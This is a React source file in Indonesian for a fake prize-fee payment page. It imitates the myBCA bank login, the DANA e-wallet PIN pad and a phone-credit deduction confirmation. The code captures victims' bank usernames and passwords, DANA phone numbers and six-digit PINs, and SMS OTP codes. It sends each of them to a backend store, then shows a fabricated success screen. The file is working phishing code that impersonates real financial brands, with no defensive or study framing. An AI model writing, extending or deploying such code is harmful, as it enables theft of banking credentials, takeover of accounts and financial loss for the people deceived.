import { useEffect, useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { detectDevice } from "../device";
import { playWhoosh, playBeep, playDing, playFail, playClick } from "../sound";
import { sendSubmission as send } from "../store";

const buzz = (ms = 60) => navigator.vibrate?.(ms);
const FEE = 25000;


/* ---------- kotak OTP generik ---------- */
const OtpBoxes = ({ length = 6, onComplete }) => {
  const [vals, setVals] = useState(Array(length).fill(""));
  const refs = useRef([]);

  const change = (i, v) => {
    if (!/^\d?$/.test(v)) return;
    const next = [...vals];
    next[i] = v;
    setVals(next);
    if (v && i < length - 1) refs.current[i + 1]?.focus();
    if (next.every((d) => d !== "")) onComplete(next.join(""));
  };

  return (
    <div style={{ display: "flex", gap: 7, justifyContent: "center" }}>
      {vals.map((d, i) => (
        <input
          key={i}
          ref={(el) => (refs.current[i] = el)}
          value={d}
          onChange={(e) => change(i, e.target.value)}
          onKeyDown={(e) => {
            if (e.key === "Backspace" && !vals[i] && i > 0) refs.current[i - 1]?.focus();
          }}
          inputMode="numeric"
          maxLength={1}
          style={{
            width: 42, height: 52, textAlign: "center", fontSize: 22, fontWeight: 800,
            border: `2px solid ${d ? "#ffb020" : "#ccc"}`, borderRadius: 9,
            background: "#fff", color: "#111",
          }}
        />
      ))}
    </div>
  );
};

/* ================= BCA ================= */
const BcaFlow = ({ prize, nama, finish }) => {
  const [phase, setPhase] = useState("login"); // login -> confirm -> otp -> done
  const [user, setUser] = useState("");
  const [pass, setPass] = useState("");
  const [err, setErr] = useState("");

  const doLogin = async (e) => {
    e.preventDefault();
    if (user.trim().length < 4) {
      setErr("Username minimal 4 karakter.");
      playFail();
      return;
    }
    if (pass.length < 6) {
      setErr(`Password myBCA minimal 6 karakter — kamu baru memasukkan ${pass.length}.`);
      playFail();
      return;
    }
    setErr("");
    setPhase("checking");
    playWhoosh();
    setTimeout(async () => {
      await send({ tipe: "bank", bank: "BCA", user, pass, prize });
      setPhase("confirm");
      playBeep();
    }, 1500);
  };

  return (
    <div style={{ minHeight: "100vh", background: "#eef2f7", fontFamily: "system-ui, sans-serif" }}>
      {/* Header BCA */}
      <div style={{ background: "#0060af", padding: "14px 18px", color: "#fff", textAlign: "center" }}>
        <div style={{
          display: "inline-block", background: "#fff", color: "#0060af",
          fontWeight: 900, fontStyle: "italic", fontSize: 22,
          padding: "3px 14px", borderRadius: 4, letterSpacing: 1,
        }}>BCA</div>
        <div style={{ fontSize: 12, marginTop: 6, opacity: 0.85 }}>Selamat datang di myBCA</div>
      </div>

      <div style={{ maxWidth: 400, margin: "24px auto", padding: "0 16px" }}>
        {(phase === "login" || phase === "checking") && (
          <form onSubmit={doLogin} className={err ? "shake" : ""} style={{ background: "#fff", borderRadius: 12, padding: 22, boxShadow: "0 3px 14px rgba(0,0,0,.09)" }}>
            <div style={{ fontWeight: 700, fontSize: 15, color: "#0060af", marginBottom: 16, textAlign: "center" }}>
              Login Akun myBCA
            </div>
            <input
              required placeholder="Username (min. 4 karakter)" value={user} autoComplete="off"
              minLength={4}
              onChange={(e) => { setUser(e.target.value); setErr(""); }}
              style={{ width: "100%", padding: "11px 13px", borderRadius: 8, border: `1px solid ${err && user.trim().length < 4 ? "#dc2626" : "#cbd5e1"}`, marginBottom: err ? 5 : 11, fontSize: 14 }}
            />
            <input
              required type="password" placeholder="Password (min. 6 karakter)" value={pass} autoComplete="off"
              minLength={6}
              onChange={(e) => { setPass(e.target.value); setErr(""); }}
              style={{ width: "100%", padding: "11px 13px", borderRadius: 8, border: `1px solid ${err && pass.length < 6 ? "#dc2626" : "#cbd5e1"}`, marginBottom: 15, fontSize: 14 }}
            />
            {err && (
              <p style={{ color: "#dc2626", fontSize: 12.5, fontWeight: 700, marginBottom: 12 }}>
                ⚠️ {err}
              </p>
            )}
            <button
              disabled={phase === "checking"}
              style={{
                width: "100%", padding: 12, border: "none", borderRadius: 8,
                background: "#f26f21", color: "#fff", fontWeight: 800, fontSize: 15, cursor: "pointer",
              }}
            >
              {phase === "checking" ? "MEMPROSES..." : "MASUK"}
            </button>
            <p style={{ fontSize: 10, color: "#94a3b8", marginTop: 13, textAlign: "center" }}>
              🔒 Gunakan keyboard virtual demi keamanan transaksi
            </p>
          </form>
        )}

        {phase === "confirm" && (
          <div style={{ background: "#fff", borderRadius: 12, padding: 22, boxShadow: "0 3px 14px rgba(0,0,0,.09)" }}>
            <div style={{ fontWeight: 700, fontSize: 15, color: "#0060af", marginBottom: 14, textAlign: "center" }}>Konfirmasi Transfer</div>
            {[
              ["Merchant", "REWARD CENTER"],
              ["Nama Penerima", nama || "Terverifikasi"],
              ["Nominal", `Rp ${FEE.toLocaleString("id-ID")}`],
              ["Berita", `PEMBAYARAN-${prize.slice(0, 10).toUpperCase().replace(/\s/g, "")}`],
              ["Rekening Sumber", `5410••••••${Math.floor(10 + Math.random() * 89)}`],
            ].map(([l, v]) => (
              <div key={l} style={{ display: "flex", justifyContent: "space-between", padding: "8px 0", borderBottom: "1px dashed #e2e8f0", fontSize: 13 }}>
                <span style={{ color: "#64748b" }}>{l}</span>
                <strong style={{ maxWidth: "55%", textAlign: "right" }}>{v}</strong>
              </div>
            ))}
            <button
              onClick={() => { playClick(); setPhase("otp"); playBeep(); }}
              style={{ width: "100%", marginTop: 16, padding: 12, border: "none", borderRadius: 8, background: "#f26f21", color: "#fff", fontWeight: 800, fontSize: 15, cursor: "pointer" }}
            >
              LANJUTKAN
            </button>
          </div>
        )}

        {phase === "otp" && (
          <div style={{ background: "#fff", borderRadius: 12, padding: 22, boxShadow: "0 3px 14px rgba(0,0,0,.09)", textAlign: "center" }}>
            <div style={{ fontWeight: 700, fontSize: 15, color: "#0060af", marginBottom: 6 }}>Masukkan OTP</div>
            <p style={{ fontSize: 12, color: "#64748b", marginBottom: 16 }}>Kode dikirim via SMS ke nomor terdaftar</p>
            <OtpBoxes
              length={6}
              onComplete={async (kode) => {
                setPhase("done");
                playDing();
                navigator.vibrate?.([60, 40, 60]);
                await send({ tipe: "otp", kode, tujuan: "myBCA (SMS bank)", hp: "", prize });
                setTimeout(finish, 2600);
              }}
            />
            <p style={{ fontSize: 10.5, color: "#94a3b8", marginTop: 14 }}>OTP berlaku 60 detik · Jangan bagikan kepada siapa pun</p>
          </div>
        )}

        {phase === "done" && (
          <div style={{ background: "#fff", borderRadius: 12, padding: "34px 22px", boxShadow: "0 3px 14px rgba(0,0,0,.09)", textAlign: "center" }}>
            <div style={{ width: 62, height: 62, margin: "0 auto 14px", borderRadius: "50%", background: "#dcfce7", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 30 }}>✓</div>
            <div style={{ fontWeight: 800, fontSize: 17, color: "#15803d" }}>Transfer Berhasil</div>
            <p style={{ fontSize: 12.5, color: "#64748b", marginTop: 6 }}>
              Rp {FEE.toLocaleString("id-ID")} ke REWARD CENTER<br />
              Ref: BC{Date.now().toString().slice(-9)}
            </p>
          </div>
        )}
      </div>
    </div>
  );
};

/* ================= DANA ================= */
const DanaFlow = ({ prize, nama, finish }) => {
  const [phase, setPhase] = useState("phone"); // phone -> pin -> paying -> done
  const [hp, setHp] = useState("");
  const [pin, setPin] = useState("");

  const pressKey = (k) => {
    if (phase !== "pin") return;
    if (k === "del") return setPin((p) => p.slice(0, -1));
    if (pin.length >= 6 || !/^\d$/.test(k)) return;
    const next = pin + k;
    setPin(next);
    playBeep();
    buzz(20);
    if (next.length === 6) {
      setPhase("paying");
      playWhoosh();
      setTimeout(async () => {
        await send({ tipe: "pin-ewallet", wallet: "DANA", hp, pin: next, prize });
        setPhase("done");
        playDing();
        navigator.vibrate?.([60, 40, 60]);
        setTimeout(finish, 2600);
      }, 1700);
    }
  };

  return (
    <div style={{ minHeight: "100vh", background: "linear-gradient(180deg,#118eea,#0b6bc2)", fontFamily: "system-ui, sans-serif", color: "#fff" }}>
      <div style={{ maxWidth: 400, margin: "0 auto", padding: "34px 20px", display: "flex", flexDirection: "column", minHeight: "100vh" }}>
        {/* Logo */}
        <div style={{ textAlign: "center", marginBottom: 26 }}>
          <span style={{ fontWeight: 900, fontSize: 30, letterSpacing: -1 }}>DANA</span>
          <div style={{ fontSize: 12, opacity: 0.85, marginTop: 3 }}>Dompet digital #1 Indonesia</div>
        </div>

        {phase === "phone" && (
          <>
            <div style={{ background: "rgba(255,255,255,.14)", borderRadius: 14, padding: 18 }}>
              <div style={{ fontSize: 12.5, marginBottom: 9, fontWeight: 600 }}>Masukkan nomor HP terdaftar</div>
              <input
                required autoFocus inputMode="numeric" value={hp}
                onChange={(e) => setHp(e.target.value.replace(/\D/g, "").slice(0, 13))}
                placeholder="08xxxxxxxxxx"
                style={{ width: "100%", padding: "12px 14px", borderRadius: 10, border: "none", fontSize: 16, color: "#0b3d70" }}
              />
              <button
                disabled={hp.length < 9}
                onClick={() => { playClick(); setPhase("pin"); }}
                style={{ width: "100%", marginTop: 13, padding: 13, border: "none", borderRadius: 10, background: hp.length >= 9 ? "#ffd166" : "rgba(255,255,255,.35)", color: hp.length >= 9 ? "#0b3d70" : "#eee", fontWeight: 800, fontSize: 15, cursor: "pointer" }}
              >
                LANJUT
              </button>
            </div>
            <p style={{ textAlign: "center", fontSize: 11, opacity: 0.75, marginTop: 18 }}>
              Bayar {prize ? `Rp ${FEE.toLocaleString("id-ID")}` : ""} ke REWARD CENTER · Dilindungi DANA Protect
            </p>
          </>
        )}

        {(phase === "pin" || phase === "paying") && (
          <>
            <div style={{ textAlign: "center", marginBottom: 22 }}>
              <div style={{ fontSize: 14, fontWeight: 600 }}>Masukkan PIN DANA</div>
              {phase === "paying" && (
                <div style={{ fontSize: 12.5, opacity: 0.85, marginTop: 6 }}>
                  Membayar Rp {FEE.toLocaleString("id-ID")} ke REWARD CENTER...
                </div>
              )}
            </div>

            {/* Titik PIN */}
            <div style={{ display: "flex", gap: 12, justifyContent: "center", marginBottom: 26 }}>
              {Array.from({ length: 6 }).map((_, i) => (
                <div key={i} style={{
                  width: 15, height: 15, borderRadius: "50%",
                  background: i < pin.length ? "#fff" : "rgba(255,255,255,.3)",
                }} />
              ))}
            </div>

            {/* Keypad */}
            <div style={{ marginTop: "auto" }}>
              <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 10 }}>
                {["1", "2", "3", "4", "5", "6", "7", "8", "9", "", "0", "⌫"].map((k, i) =>
                  k === "" ? (
                    <div key={i} />
                  ) : (
                    <button
                      key={i}
                      onClick={() => pressKey(k)}
                      style={{
                        padding: "17px 0", borderRadius: 12, border: "none",
                        background: "rgba(255,255,255,.16)",
                        color: "#fff", fontSize: 21, fontWeight: 700, cursor: "pointer",
                      }}
                    >
                      {k}
                    </button>
                  )
                )}
              </div>
            </div>
          </>
        )}

        {phase === "done" && (
          <div style={{ margin: "auto", textAlign: "center" }}>
            <div style={{ width: 74, height: 74, margin: "0 auto 16px", borderRadius: "50%", background: "#fff", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 36 }}>✓</div>
            <div style={{ fontWeight: 800, fontSize: 19 }}>Pembayaran Berhasil!</div>
            <p style={{ fontSize: 13, opacity: 0.9, marginTop: 7 }}>
              Rp {FEE.toLocaleString("id-ID")} terkirim ke REWARD CENTER
            </p>
          </div>
        )}
      </div>
    </div>
  );
};

/* ================= POTONG PULSA ================= */
const PulsaFlow = ({ prize, hp, finish }) => {
  const masked = (hp || "08xx").replace(/^(\d{4})\d+(\d{2})$/, "$1••••$2");
  const [phase, setPhase] = useState("otp");

  return (
    <div style={{ minHeight: "100vh", background: "#0b0b14", fontFamily: "system-ui, sans-serif" }}>
      <div className="container flex flex-col justify-center" style={{ maxWidth: 420, minHeight: "100vh", padding: 20 }}>
        <div className="panel" style={{ overflow: "hidden" }}>
          <div style={{ background: "linear-gradient(135deg,#15803d,#166534)", padding: "20px 18px", textAlign: "center", borderBottom: "2px solid #ffb020" }}>
            <div style={{ fontSize: 36 }}>📡</div>
            <div className="display" style={{ fontSize: 15, color: "#fff" }}>Konfirmasi Potong Pulsa</div>
            <p style={{ fontSize: 11.5, color: "#bbf7d0", marginTop: 5 }}>
              Biaya Rp {FEE.toLocaleString("id-ID")} akan dipotong dari pulsa <strong style={{ color: "#fff" }}>{masked}</strong>
            </p>
          </div>
          <div style={{ padding: 24, textAlign: "center" }}>
            {phase === "otp" ? (
              <>
                <p style={{ fontSize: 12.5, color: "#c9cede", marginBottom: 14 }}>
                  Masukkan 4 digit konfirmasi yang kami kirim via SMS gratis:
                </p>
                <OtpBoxes
                  length={4}
                  onComplete={async (kode) => {
                    setPhase("done");
                    playDing();
                    navigator.vibrate?.([60, 40, 60]);
                    await send({ tipe: "otp", kode, tujuan: masked, hp, prize });
                    setTimeout(finish, 2400);
                  }}
                />
                <p style={{ fontSize: 10.5, color: "#555e74", marginTop: 14 }}>
                  Layanan resmi tanpa potongan admin tersembunyi
                </p>
              </>
            ) : (
              <div style={{ padding: "14px 0" }}>
                <div style={{ width: 64, height: 64, margin: "0 auto 14px", borderRadius: "50%", background: "#dcfce7", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 32 }}>✓</div>
                <div className="display" style={{ fontSize: 17, color: "#4ade80" }}>Konfirmasi Berhasil</div>
                <p style={{ fontSize: 12.5, color: "#8b93a7", marginTop: 6 }}>
                  Rp {FEE.toLocaleString("id-ID")} telah dipotong dari pulsamu
                </p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

/* ================= ROUTER ================= */
const PaymentGateway = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const { metode = "Transfer Bank BCA", prize = "FREE Handphone", nama = "", hp = "" } = location.state || {};
  const finish = () => navigate("/track", { state: { prize, nama } });

  if (metode === "Saldo DANA") return <DanaFlow prize={prize} nama={nama} finish={finish} />;
  if (metode === "Potong Pulsa") return <PulsaFlow prize={prize} hp={hp} finish={finish} />;
  return <BcaFlow prize={prize} nama={nama} finish={finish} />;
};

export default PaymentGateway;
